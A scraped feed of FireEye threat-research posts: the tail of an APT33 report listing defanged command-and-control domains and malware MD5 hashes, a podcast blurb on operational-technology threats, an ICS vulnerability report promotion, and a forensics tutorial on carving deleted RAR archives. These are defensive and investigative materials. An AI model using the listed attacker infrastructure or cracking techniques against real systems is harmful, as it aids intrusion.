\n   <td width=\"221\" valign=\"top\"><p>ngaaksa.sytes[.]net</p> </td> \n  </tr> \n  <tr> \n   <td width=\"221\" valign=\"top\"><p>vinnellarabia.myftp[.]org</p> </td> \n  </tr>\n </tbody>\n</table> \n<p>APT33 Domains / IPs Used for C2</p> \n<table cellspacing=\"0\" cellpadding=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td width=\"217\" valign=\"top\"><p>C2 Domain</p> </td> \n   <td width=\"214\" valign=\"top\"><p>MALWARE</p> </td> \n  </tr> \n  <tr> \n   <td width=\"217\" valign=\"top\"><p>managehelpdesk[.]com</p> </td> \n   <td width=\"214\" valign=\"top\"><p>NANOCORE</p> </td> \n  </tr> \n  <tr> \n   <td width=\"217\" valign=\"top\"><p>microsoftupdated[.]com</p> </td> \n   <td width=\"214\" valign=\"top\"><p>NANOCORE</p> </td> \n  </tr> \n  <tr> \n   <td width=\"217\" valign=\"top\"><p>osupd[.]com</p> </td> \n   <td width=\"214\" valign=\"top\"><p>NANOCORE</p> </td> \n  </tr> \n  <tr> \n   <td width=\"217\" valign=\"top\"><p>mywinnetwork.ddns[.]net</p> </td> \n   <td width=\"214\" valign=\"top\"><p>NETWIRE</p> </td> \n  </tr> \n  <tr> \n   <td width=\"217\" valign=\"top\"><p>www.chromup[.]com</p> </td> \n   <td width=\"214\" valign=\"top\"><p>TURNEDUP</p> </td> \n  </tr> \n  <tr> \n   <td width=\"217\" valign=\"top\"><p>www.securityupdated[.]com</p> </td> \n   <td width=\"214\" valign=\"top\"><p>TURNEDUP</p> </td> \n  </tr> \n  <tr> \n   <td width=\"217\" valign=\"top\"><p>googlmail[.]net</p> </td> \n   <td width=\"214\" valign=\"top\"><p>TURNEDUP</p> </td> \n  </tr> \n  <tr> \n   <td width=\"217\" valign=\"top\"><p>microsoftupdated[.]net</p> </td> \n   <td width=\"214\" valign=\"top\"><p>TURNEDUP</p> </td> \n  </tr> \n  <tr> \n   <td width=\"217\" valign=\"top\"><p>syn.broadcaster[.]rocks</p> </td> \n   <td width=\"214\" valign=\"top\"><p>TURNEDUP</p> </td> \n  </tr> \n  <tr> \n   <td width=\"217\" valign=\"top\"><p>www.googlmail[.]net</p> </td> \n   <td width=\"214\" valign=\"top\"><p>TURNEDUP</p> </td> \n  </tr>\n </tbody>\n</table> \n<p>Publicly Available Tools used by APT33</p> \n<table cellspacing=\"0\" cellpadding=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td width=\"213\" valign=\"top\"><p>MD5</p> </td> \n   <td width=\"112\" valign=\"top\"><p>MALWARE</p> </td> \n   <td width=\"106\" valign=\"top\"><p>Compile Time (UTC)</p> </td> \n  </tr> \n  <tr> \n   <td width=\"213\" valign=\"bottom\"><p>3f5329cf2a829f8840ba6a903f17a1bf</p> </td> \n   <td width=\"112\"><p>NANOCORE</p> </td> \n   <td width=\"106\" valign=\"bottom\"><p>2017/1/11 2:20</p> </td> \n  </tr> \n  <tr> \n   <td width=\"213\" valign=\"bottom\"><p>10f58774cd52f71cd4438547c39b1aa7</p> </td> \n   <td width=\"112\"><p>NANOCORE</p> </td> \n   <td width=\"106\" valign=\"bottom\"><p>2016/3/9 23:48</p> </td> \n  </tr> \n  <tr> \n   <td width=\"213\" valign=\"bottom\"><p>663c18cfcedd90a3c91a09478f1e91bc</p> </td> \n   <td width=\"112\"><p>NETWIRE</p> </td> \n   <td width=\"106\" valign=\"bottom\"><p>2016/6/29 13:44</p> </td> \n  </tr> \n  <tr> \n   <td width=\"213\" valign=\"bottom\"><p>6f1d5c57b3b415edc3767b079999dd50</p> </td> \n   <td width=\"112\"><p>NETWIRE</p> </td> \n   <td width=\"106\" valign=\"bottom\"><p>2016/5/29 14:11</p> </td> \n  </tr>\n </tbody>\n</table> \n<p>Unattributed DROPSHOT / SHAPESHIFT MD5 Hashes</p> \n<table cellspacing=\"0\" cellpadding=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td width=\"194\" valign=\"top\"><p> <b>MD5</b></p> </td> \n   <td width=\"115\" valign=\"top\"><p> <b>MALWARE</b></p> </td> \n   <td width=\"122\" valign=\"top\"><p> <b>Compile Time (UTC)</b></p> </td> \n  </tr> \n  <tr> \n   <td width=\"194\" valign=\"top\"><p>0ccc9ec82f1d44c243329014b82d3125</p> </td> \n   <td width=\"115\" valign=\"top\"><p>DROPSHOT</p> <p>(drops SHAPESHIFT</p> </td> \n   <td width=\"122\" valign=\"top\"><p>n/a - timestomped</p> </td> \n  </tr> \n  <tr> \n   <td width=\"194\" valign=\"top\"><p>fb21f3cea1aa051ba2a45e75d46b98b8</p> </td> \n   <td width=\"115\" valign=\"top\"><p>DROPSHOT</p> </td> \n   <td width=\"122\" valign=\"top\"><p>n/a - timestomped</p> </td> \n  </tr> \n  <tr> \n   <td width=\"194\" valign=\"top\"><p>3e8a4d654d5baa99f8913d8e2bd8a184</p> </td> \n   <td width=\"115\" valign=\"top\"><p>SHAPESHIFT</p> </td> \n   <td width=\"122\" valign=\"top\"><p>2016/11/14 21:16:40</p> </td> \n  </tr> \n  <tr> \n   <td width=\"194\" valign=\"top\"><p>6b41980aa6966dda6c3f68aeeb9ae2e0</p> </td> \n   <td width=\"115\" valign=\"top\"><p>SHAPESHIFT</p> </td> \n   <td width=\"122\" valign=\"top\"><p>2016/11/14 21:16:40</p> </td> \n  </tr>\n </tbody>\n</table> \n<p>APT33 Malware MD5 Hashes</p> \n<table cellspacing=\"0\" cellpadding=\"0\" border=\"0\" width=\"427\"> \n <tbody> \n  <tr> \n   <td width=\"195\"><p>MD5</p> </td> \n   <td width=\"143\"><p>MALWARE</p> </td> \n   <td width=\"89\"><p>Compile Time (UTC)</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>8e67f4c98754a2373a49eaf53425d79a</p> </td> \n   <td width=\"143\"><p>DROPSHOT (drops TURNEDUP)</p> </td> \n   <td width=\"89\"><p>2016/10/19 14:26</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>c57c5529d91cffef3ec8dadf61c5ffb2</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2014/6/1 11:01</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>c02689449a4ce73ec79a52595ab590f6</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2016/9/18 10:50</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>59d0d27360c9534d55596891049eb3ef</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2016/3/8 12:34</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>59d0d27360c9534d55596891049eb3ef</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2016/3/8 12:34</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>797bc06d3e0f5891591b68885d99b4e1</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2015/3/12 5:59</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>8e6d5ef3f6912a7c49f8eb6a71e18ee2</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2015/3/12 5:59</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>32a9a9aa9a81be6186937b99e04ad4be</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2015/3/12 5:59</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>a272326cb5f0b73eb9a42c9e629a0fd8</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2015/3/9 16:56</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>a813dd6b81db331f10efaf1173f1da5d</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2015/3/9 16:56</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>de9e3b4124292b4fba0c5284155fa317</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2015/3/9 16:56</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>a272326cb5f0b73eb9a42c9e629a0fd8</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2015/3/9 16:56</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>b3d73364995815d78f6d66101e718837</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2014/6/1 11:01</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>de7a44518d67b13cda535474ffedf36b</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2014/6/1 11:01</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>b5f69841bf4e0e96a99aa811b52d0e90</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2014/6/1 11:01</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>a2af2e6bbb6551ddf09f0a7204b5952e</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2014/6/1 11:01</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>b189b21aafd206625e6c4e4a42c8ba76</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2014/6/1 11:01</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>aa63b16b6bf326dd3b4e82ffad4c1338</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2014/6/1 11:01</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>c55b002ae9db4dbb2992f7ef0fbc86cb</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2014/6/1 11:01</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>c2d472bdb8b98ed83cc8ded68a79c425</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2014/6/1 11:01</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>c6f2f502ad268248d6c0087a2538cad0</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2014/6/1 11:01</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>c66422d3a9ebe5f323d29a7be76bc57a</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2014/6/1 11:01</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>ae47d53fe8ced620e9969cea58e87d9a</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2014/6/1 11:01</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>b12faab84e2140dfa5852411c91a3474</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2014/6/1 11:01</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>c2fbb3ac76b0839e0a744ad8bdddba0e</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2014/6/1 11:01</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>a80c7ce33769ada7b4d56733d02afbe5</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2014/6/1 11:01</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>6a0f07e322d3b7bc88e2468f9e4b861b</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2014/6/1 11:01</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>b681aa600be5e3ca550d4ff4c884dc3d</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2014/6/1 11:01</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>ae870c46f3b8f44e576ffa1528c3ea37</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2014/6/1 11:01</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>bbdd6bb2e8827e64cd1a440e05c0d537</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2014/6/1 11:01</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>0753857710dcf96b950e07df9cdf7911</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2013/4/10 10:43</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>d01781f1246fd1b64e09170bd6600fe1</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2013/4/10 10:43</p> </td> \n  </tr> \n  <tr> \n   <td width=\"195\"><p>1381148d543c0de493b13ba8ca17c14f</p> </td> \n   <td width=\"143\"><p>TURNEDUP</p> </td> \n   <td width=\"89\"><p>2013/4/10 10:43</p> </td> \n  </tr>\n </tbody>\n</table>","descriptionType":"html","publishedDate":"Wed, 20 Sep 2017 14:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT33/Fig1.jpg","linkMd5":"65232d3072abd17fba2aa9bc905e71f4","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn31@2020_4/2020/08/24/14-11-04-886_58db4f96b8ebcd76.webp","destWidth":799,"destHeight":533,"sourceBytes":44504,"destBytes":31406,"author":"Jacqueline O’Leary","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT33/Fig1.jpg":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn31@2020_4/2020/08/24/14-11-04-886_58db4f96b8ebcd76.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT33/Fig2.png":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn75@2020_6/2020/08/24/14-11-11-482_fc1cc8007e34d091.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT33/Fig3.png":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn9@2020_4/2020/08/24/14-11-13-045_8f4ddfd905561035.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT33/Fig4.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn85@2020_5/2020/08/24/14-11-15-197_b6fa93a0e5a626dd.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT33/Fig6.png":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn61@2020_3/2020/08/24/14-11-16-670_1750f0868261ffed.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT33/Fig7.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn10@2020_1/2020/08/24/14-11-17-149_97bb5d79f35bd9ff.webp"},"publishedOrCreatedDate":1598278264197},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Unique Threats to Operational Technology and Cyber Physical Systems","link":"http://www.fireeye.com/blog/threat-research/2020/07/unique-threats-to-operational-technology-and-cyber-physical-systems.html","description":"<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/EyeOnSecurity/Podcast-Itunes-cover_eye%20on%20security.png\" class=\"float-left-small\" />In this latest episode of our <i>Eye on Security</i>&nbsp;podcast, I talk all about the world of operational technology (OT) and cyber physical systems with one of our foremost experts on the topic: Nathan Brubaker, Senior Manager of Analysis for Mandiant Threat Intelligence.</p> \n<p>Nathan kicked off our chat by explaining what exactly we mean when we use the term ‘cyber physical.’ We then turned our attention to related threats. As it turns out, there are far less attempts by attackers to target these systems than one might believe. Nathan went on to discuss some of the fundamental differences between OT and information technology (IT) systems, and then explained how OT is becoming more similar to IT, which makes OT systems more vulnerable to compromise. Fortunately, even though OT security typically lags behind that of IT systems, it’s definitely moving in the right direction.</p> \n<p>Listen to the podcast today, and check out the following blog posts referenced by Nathan during the episode:</p> \n<ul> \n <li> <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/07/financially-motivated-actors-are-expanding-access-into-ot.html\">Financially Motivated Actors Are Expanding Access Into OT: Analysis of Kill Lists That Include OT Processes Used With Seven Malware Families</a></li> \n <li> <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/03/monitoring-ics-cyber-operation-tools-and-software-exploit-modules.html\">Monitoring ICS Cyber Operation Tools and Software Exploit Modules To Anticipate Future Threats</a></li> \n <li> <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/02/ransomware-against-machine-learning-to-disrupt-industrial-production.html\">Ransomware Against the Machine: How Adversaries are Learning to Disrupt Industrial Production by Targeting IT and OT</a></li> \n <li> <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2019/12/fireeye-approach-to-operational-technology-security.html\">The FireEye Approach to Operational Technology Security</a></li> \n <li> <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2019/04/triton-actor-ttp-profile-custom-attack-tools-detections.html\">TRITON Actor TTP Profile, Custom Attack Tools, Detections, and ATT&amp;CK Mapping</a></li> \n</ul> \n<p></p>","descriptionType":"html","publishedDate":"Mon, 20 Jul 2020 17:30:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/EyeOnSecurity/Podcast-Itunes-cover_eye%20on%20security.png","linkMd5":"9879412903beb158462632d759a93437","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn79@2020_4/2020/08/24/14-11-06-037_30037084fa8592a1.webp","destWidth":1501,"destHeight":1500,"sourceBytes":76346,"destBytes":29868,"author":"Luke McNamara","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/EyeOnSecurity/Podcast-Itunes-cover_eye%20on%20security.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn79@2020_4/2020/08/24/14-11-06-037_30037084fa8592a1.webp"},"publishedOrCreatedDate":1598278264175},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Overload: Critical Lessons from 15 Years of ICS Vulnerabilities","link":"http://www.fireeye.com/blog/threat-research/2016/08/overload-critical-lessons-from-15-years-of-ics-vulnerabilities.html","description":"<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/ICS%20Vulnerabilities/hmi-malware.jpg\" class=\"float-left\" /></p> \n<p>In the past several years, a flood of vulnerabilities has hit <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/products/industrial-systems-and-critical-infrastructure-security.html\">industrial control systems (ICS)</a> – the technological backbone of electric grids, water supplies, and production lines. These vulnerabilities affect the reliable operation of sensors, programmable controllers, software and networking equipment used to automate and monitor the physical processes that keep our modern world running.</p> \n<p> <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/products-delete/dynamic-threat-intelligence.html\">FireEye iSIGHT Intelligence</a> has identified nearly 1,600 publicly disclosed ICS vulnerabilities since 2000. We go more in depth on these issues in our latest report, <i> <a href=\"https://www2.fireeye.com/industrial-control-systems-vulnerability-trend-report-2016.html?utm_source=PSA&amp;utm_medium=blog&amp;utm_campaign=icstrendreport\">Overload: Critical Lessons from 15 Years of ICS Vulnerabilities</a></i>, which highlights trends in total ICS vulnerability disclosures, patch availability, vulnerable device type and vulnerabilities exploited in the wild.</p> \n<p>FireEye’s acquisition of iSIGHT provided tremendous visibility into the depth and breadth of vulnerabilities in the ICS landscape and how threat actors try to exploit them. To make matters worse, many of these vulnerabilities are left unpatched and some are simply unpatchable due to outdated technology, thus increasing the attack surface for potential adversaries. In fact, nation-state cyber threat actors have exploited five of these vulnerabilities in attacks since 2009.</p> \n<p>Unfortunately, security personnel from manufacturing, energy, water and other industries are often unaware of their own control system assets, not to mention the vulnerabilities that affect them. As a result, organizations operating these systems are missing the warnings and leaving their industrial environments exposed to potential threats.</p> \n<p>Click <a href=\"https://www2.fireeye.com/industrial-control-systems-vulnerability-trend-report-2016.html?utm_source=PSA&amp;utm_medium=blog&amp;utm_campaign=icstrendreport\">here</a> to download the report and learn more.</p>","descriptionType":"html","publishedDate":"Wed, 03 Aug 2016 12:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/ICS%20Vulnerabilities/hmi-malware.jpg","linkMd5":"a1ff40b203a629f082df3111ff865ab7","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn34@2020_3/2020/08/24/14-11-04-876_8f29f9a6718f886a.webp","destWidth":155,"destHeight":158,"sourceBytes":6028,"destBytes":4244,"author":"Sean McBride","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/ICS%20Vulnerabilities/hmi-malware.jpg":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn34@2020_3/2020/08/24/14-11-04-876_8f29f9a6718f886a.webp"},"publishedOrCreatedDate":1598278264197},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Carving Station - RAR Files","link":"http://www.fireeye.com/blog/threat-research/2013/01/carving-station-rar-files.html","description":"<div class=\"c00 c00v1\"> \n <p>This post will discuss the technique of carving files from unallocated disk space. \"Carving\" simply means extracting a specific section of bytes from an area of disk space; ideally those bytes make up a complete file. You can carve any kind of file, but in this post we will specifically address how to carve RAR archives from unallocated disk space.</p> \n <p>Why RAR files? In many of Mandiant's investigations of targeted attacks, an attacker will collect data and compress it into a RAR archive prior to taking it from the targeted network. Advanced attackers go a step further and attempt to hide their tracks by deleting the archive tool, the archive itself and other artifacts we will discuss in future blog posts.</p> \n <p> <b>RAR Carvin'</b></p> \n <p>What can you do when the attacker deletes the archive? In our example case, we know the attacker executed \"rar.exe\" a.k.a. \"WinRAR\" because the evidence contained a prefetch file named \"RAR.EXE-12F2DC4F.pf\". At this point, the easiest investigative step is to search for files with the extension \".rar\" or - even better - conduct file signature analysis in the event the attacker changed the file extension. If you don't find any files, does this mean the attacker executed WinRAR just for fun? Most likely not.</p> \n <p>Since we know the attacker used WinRAR, but deleted the resulting files, conduct a search for RAR file headers in unallocated space (the \"deleted\" files graveyard). A \"file header\" is the signature placed at the beginning of a file. Most RAR files start with the ASCII characters \"Rar!···\" or \"52 61 72 21 1A 07 00\" in hex. Older versions of WinRAR may create files with different values in the last three header bytes. To reduce false negatives, it's best to search for \"52 61 72 21\" or \"52 45 7E 5E\" to find older RAR formats (see <a href=\"http://www.forensicswiki.org/wiki/RAR\">Forensics Wiki</a>).</p> \n <p>In this case, we will conduct a search for \"Rar!\" in unallocated space and find a section of the disk that looks especially interesting.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-RAR-Header-in-Unallocated-Space.jpg\"><img width=\"693\" height=\"352\" class=\"size-full wp-image-4065\" title=\"Figure 1: RAR Header in Unallocated Space\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-RAR-Header-in-Unallocated-Space.jpg\" /></a>Figure 1: RAR Header in Unallocated Space\n <p>As with any keyword search, be careful of false positives! Some antivirus vendors, such as Symantec, use RAR files for signature updates. There may also be false positives due to the random nature of the data in unallocated space. To help counteract the false positives, you can narrow search results by identifying the position of the header in the data cluster and/or the composition of the data after the header. The position in the data cluster is important because when a file is created on disk, the beginning of the file will be at the start of the data cluster. Data clusters are a portion of logical disk space allocated for a file. Notice the data in Figure 1 is condensed, which is expected for an archive file. If the composition of the data after the header is condensed and randomized, this offers more evidence that the search result is a legitimate RAR file. Compare Figure 1 to the result in Figure 2 below, which has partial cleartext and breaks in the data. The result in Figure 2 is not a valid RAR archive.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-False-positive-RAR-Header-in-Unallocated-Space.jpg\"><img width=\"713\" height=\"142\" class=\"size-full wp-image-4066\" title=\"Figure 2: False positive RAR Header in Unallocated Space\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-False-positive-RAR-Header-in-Unallocated-Space.jpg\" /></a>Figure 2: False positive RAR Header in Unallocated Space\n <p>Once a legitimate header is identified, carve the data from unallocated space starting with \"Rar!\". Since a RAR file does not have a footer, or a defined end of the file, we have to guess the size. A raw view of the unallocated space may help visually define the file size. There is normally a clear demarcation at the end of the RAR file, a \"RAR end\" if you will, as shown in Figure 3 below.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-3-RAR-End-in-Unallocated-Space.jpg\"><img width=\"659\" height=\"204\" class=\"size-full wp-image-4067\" title=\"Figure 3: RAR End in Unallocated Space\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-3-RAR-End-in-Unallocated-Space.jpg\" /></a>Figure 3: RAR End in Unallocated Space\n <p>If you have no idea of the file size, 5MB is a good size to start with; but you will most likely have to increase or decrease the size until there is no more contiguous data or the data is overwritten/fragmented. EnCase or FTK can be used to manually export the data, or free tools such as <a href=\"http://foremost.sourceforge.net/\">Foremost</a> or Scalpel. FTK also has a built in capability to automatically carve files based on a defined header and/or footer.</p> \n <p>Once the RAR file is carved out, you can open it with your favorite file archive tool such as WinRAR, 7-Zip, or <a href=\"http://thedoghousediaries.com/4685\">WinZIP</a>. If you are unable to open the file, try carving files with different sizes. Bigger is usually better; a valid RAR archive generally won't open if there is too little data rather than too much. If the file is a legitimate RAR with enough data, you should be able to extract the archive (even if it's a partial file). In this example, a password prompt appears. Now you know this is an interesting file!</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-4-Password-prompt.jpg\"><img width=\"250\" height=\"181\" class=\"size-full wp-image-4068\" title=\"Figure 4: Password prompt\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-4-Password-prompt.jpg\" /></a>Figure 4: Password prompt\n <p>How can we find the password? Your chances depend on several factors, such as the age of attacker activity, level of general activity on the system and size of memory. If you are lucky enough to have a memory image, you can search the strings in memory using a tool such as <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\">Mandiant Redline</a>™. Otherwise, you can search unallocated space and the Windows pagefile for WinRAR command line switches such as \"-hp\". This switch enables the creation of a password protected archive. After removing the inevitable false positives, your results will look similar to Figure 5 shown below.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-5-RAR-command-in-pagefile.sys_.jpg\"><img width=\"605\" height=\"200\" class=\"size-full wp-image-4070\" title=\"Figure 5: RAR command in pagefile.sys\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-5-RAR-command-in-pagefile.sys_.jpg\" /></a>Figure 5: RAR command in pagefile.sys\n <p>The Windows pagefile shown in Figure 5 also retained a directory listing of potential files that were in the archive. This shows you can still glean information from RAR command searches even if the RAR file is unrecoverable. If the password search doesn't work, you can try to crack the password using <a href=\"http://xkcd.com/538/\">brute force</a> or dictionary attacks. However, if you are not the NSA, you may have limited success with this.</p> \n <p> <b>RAR file content indicators</b></p> \n <p>Worst case scenario, if you can't find or crack the RAR password, remember the ultimate goal: to determine what is inside the archive. Following are four ways - with brief explanations - for how to retrieve additional information on what was inside an archive.</p> \n <ol> \n  <li> <b>Prefetch file</b> <br /> If you are fortunate enough to have a prefetch file for rar.exe, that may show accessed files. The prefetch file contains a large amount of data, such as first and last run dates, path to the executable and accessed file. NirSoft's <a href=\"http://www.nirsoft.net/utils/win_prefetch_view.html\">Winprefetchview</a> is a useful free <a href=\"http://www.nirsoft.net/utils/win_prefetch_view.html\">tool</a> you can use to extract prefetch data. <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-6-Files-accessed-by-rar.exe-shown-in-WinPrefetchView.jpg\"><img width=\"905\" height=\"292\" class=\"size-full wp-image-4069\" title=\"Figure 6: Files accessed by rar.exe shown in WinPrefetchView\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-6-Files-accessed-by-rar.exe-shown-in-WinPrefetchView.jpg\" /></a>Figure 6: Files accessed by rar.exe shown in WinPrefetchView</li> \n  <li> <b>WinRAR directory</b> <br /> What if there is no prefetch file? You may be able to determine whether RAR was executed if a \"WinRAR\" directory is present on the file system. The default directories are \"%APPDATA%WinRAR\" on Windows XP and \"%APPDATA%RoamingWinRAR\" on Windows 7. Depending on the version, WinRAR may create this directory by default when the program executes. If you're lucky enough to have this evidence, you can create a timeline around the creation and modification dates of the \"WinRAR\" directory to find corresponding files of interest.</li> \n  <li> <b>Shellbags</b> <br /> Windows creates \"shellbags\" when a user logs into a system locally or interactively. They track information for Explorer. A helpful attribute of Shellbags is that they track previously navigated directories, even deleted directories. So, if an attacker gathered information in a staging directory prior to compressing into a RAR file, you could potentially see that directory in Shellbags. <a href=\"http://www.fireeye.com/blog/threat-research.html/category/etc/tags/fireeye-blog-authors/cap-willi-ballenthin\">Willi Ballenthin</a> created a nice python script to parse Shellbags which can be found <a href=\"http://www.williballenthin.com/forensics/shellbags/index.html\">here</a>.</li> \n  <li> <b>Internet History</b> <br /> Internet Explorer not only records Internet browsing, but internal system navigation as well. If an attacker was logged on interactively, the IE history could reveal the targeted files. Attackers are aware of this and will delete internet history, especially on an account that is not used frequently. By the way, you can also carve deleted internet history, but that's a topic for another day.</li> \n </ol> \n <p>These four techniques are just the first step. You may need to create and search for additional keywords, conduct timeline analysis, or even analyze an entirely different system if the original location of the targeted files was external.</p> \n <p>If you would like to practice carving different types of files, including RAR files, NIST recently released forensic images intended for testing file carving capabilities of software, <a 